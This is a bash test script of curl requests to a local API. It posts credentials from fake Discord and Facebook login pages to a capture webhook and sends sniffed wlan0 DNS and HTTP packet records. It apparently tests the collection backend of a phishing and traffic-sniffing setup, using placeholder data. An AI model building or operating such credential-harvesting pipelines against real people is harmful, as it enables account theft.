#!/bin/bash
echo "=== Test 1: Capture webhook (Discord login) ==="
curl -s -X POST http://localhost/api/webhook/capture \
  -H "Content-Type: application/json" \
  -H "X-Source: discord" \
  --data-raw '{"source":"discord","url":"http://discord-fake.local/login","payload":{"email":"jan.kowalski@gmail.com","password":"SuperSecret123","_event":"form_submit"}}' \
  && echo ""

echo ""
echo "=== Test 2: Capture webhook (Facebook login) ==="
curl -s -X POST http://localhost/api/webhook/capture \
  -H "Content-Type: application/json" \
  --data-raw '{"source":"facebook","url":"http://facebook-fake.local/login","payload":{"email":"anna.nowak@wp.pl","password":"qwerty2020","remember":"on"}}' \
  && echo ""

echo ""
echo "=== Test 3: Packet webhook (DNS query) ==="
curl -s -X POST http://localhost/api/webhook/packet \
  -H "Content-Type: application/json" \
  --data-raw '{"interface":"wlan0","protocol":"DNS","src_ip":"192.168.1.5","dst_ip":"8.8.8.8","src_port":53421,"dst_port":53,"packet_size":74,"summary":"DNS query: discord.com","raw":{"query":"discord.com"}}' \
  && echo ""

echo ""
echo "=== Test 4: Packet webhook (HTTP request) ==="
curl -s -X POST http://localhost/api/webhook/packet \
  -H "Content-Type: application/json" \
  --data-raw '{"interface":"wlan0","protocol":"HTTP","src_ip":"192.168.1.5","dst_ip":"104.20.3.21","src_port":52100,"dst_port":80,"packet_size":512,"flags":"PA","summary":"HTTP: GET /login HTTP/1.1","ttl":64}' \
  && echo ""

echo ""
echo "=== Test 5: /api/latest endpoint ==="
curl -s http://localhost/api/latest | python3 -m json.tool 2>/dev/null || curl -s http://localhost/api/latest
